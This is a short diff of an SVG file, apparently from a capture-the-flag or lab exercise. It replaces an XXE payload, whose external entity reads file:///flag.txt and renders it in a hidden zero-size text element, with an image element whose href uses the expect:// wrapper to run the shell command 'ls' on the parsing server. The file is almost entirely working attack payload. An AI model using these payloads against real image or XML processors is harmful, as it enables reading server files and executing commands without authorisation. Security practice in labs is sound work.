@@ -1,12 +1,3 @@
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt" > ]>
-<svg width="800" height="600" xmlns="http://www.w3.org/2000/svg">
-
- <g>
-  <title>Layer 1</title>
-  <text xml:space="preserve" text-anchor="start" font-family="Noto Sans JP" font-size="24" id="svg_1" y="100" x="229" stroke-width="0" stroke="#000" fill="#000000">asdas</text>
-  <text font-size="0" x="0" y="0">&xxe;</text>
- </g>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls" width="200" height="200"></image>
 </svg>
-
-
